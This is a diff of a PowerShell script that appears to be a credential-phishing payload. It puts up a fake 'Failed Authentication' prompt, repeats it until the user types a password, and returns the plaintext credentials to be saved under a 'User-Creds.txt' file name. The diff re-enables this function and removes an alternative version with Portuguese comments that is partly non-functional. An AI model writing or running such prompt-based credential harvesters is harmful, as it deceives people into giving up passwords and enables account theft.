@@ -2,13 +2,13 @@
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 
-<# function Get-Creds {
+function Get-Creds {
 
     $form = $null
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred = $host.ui.promptforcredential('Failed Authentication','','',''); 
         $cred.getnetworkcredential().password
 
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
@@ -33,38 +33,7 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
         }
     }
 }
-#>
 
-function Get-Creds {
-    $form = $null
-
-    while ($form -eq $null) {
-
-        # Utilize MessageBox para personalizar o prompt
-        $msgBox = New-Object System.Windows.Forms.MessageBox
-
-        # Personalizar o prompt
-        $msgBox.Text = "Autenticação necessária"  # Título
-        $msgBox.Icon = [System.Windows.MessageBoxIcon]::Warning  # Ícone
-        $msgBox.Buttons = [System.Windows.MessageBoxButton]::OK  # Botões
-
-        # Resultado do prompt
-        if ($msgBox.ShowDialog() -eq "OK") {
-            $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName)
-            $cred.getnetworkcredential().password 
-
-            if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-                # ... (seu código de tratamento de erros) ... 
-            } else {
-                $creds = $cred.GetNetworkCredential() | fl
-                return $creds
-            }
-        } else {
-            # O usuário cancelou ou fechou o prompt
-            $form = $null 
-        }
-    }
-}
 
 #----------------------------------------------------------------------------------------------------
 
